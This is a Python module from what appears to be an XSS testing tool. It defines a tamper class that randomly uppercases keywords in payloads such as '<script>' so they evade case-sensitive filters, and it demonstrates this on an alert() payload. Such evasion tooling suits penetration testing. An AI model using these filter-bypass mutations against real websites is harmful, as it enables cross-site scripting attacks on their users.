# coding=utf-8
import re
import traceback
import random
from xss.temper.temper import Temper
from xss.setting import LIGHT_MODEL
from xss.setting import HEAVY_MODEL


class UpperCase(Temper):

    def __init__(self):
        super(UpperCase, self).__init__()
        self.keywords = super(UpperCase, self).get_keywords()
        self.payload = None

    def temper(self, payload_set, model=LIGHT_MODEL, **kw):
        """
        将关键字随机大写
        eg: script->ScripT;
            img->IMg
        """
        temp_payload_set = payload_set
        if not isinstance(payload_set, set):
            payload_set = set()
            payload_set.add(temp_payload_set)
        payloads = set()
        number = 2
        for eachkw in kw:
            if eachkw == "number":
                number = kw[eachkw]

        for payload in payload_set:
            self.payload = payload
            temp_payload = payload
            payloads.add(payload)
            for keyword in self.keywords:
                if keyword in payload:
                    payloads.add(temp_payload.replace(keyword, self.rand_upper(keyword, number)))
                    payload = payload.replace(keyword, self.rand_upper(keyword, number))
                    payloads.add(payload)
        if model == LIGHT_MODEL:
            return_payload = payloads.pop()
            if return_payload != return_payload.upper():
                return payload
            else:
                return payloads.pop()
        return payloads

    def rand_upper(self, str, number):
        i = 0
        str = list(str)
        while i < number and i < len(str):
            random_index = int(random.random()*len(str))
            if str[random_index].islower():
                str[random_index] = str[random_index].upper()
                i += 1
        return "".join(str)


if __name__ == "__main__":
    payloads = set()
    payload = '<script>alert(65534);</script>'
    # for tenp in UpperCase().temper(payload, HEAVY_MODEL):
    #     print (tenp)
    print(UpperCase().temper(payload, HEAVY_MODEL))
    print("ss")
    print(UpperCase().temper(payload, LIGHT_MODEL))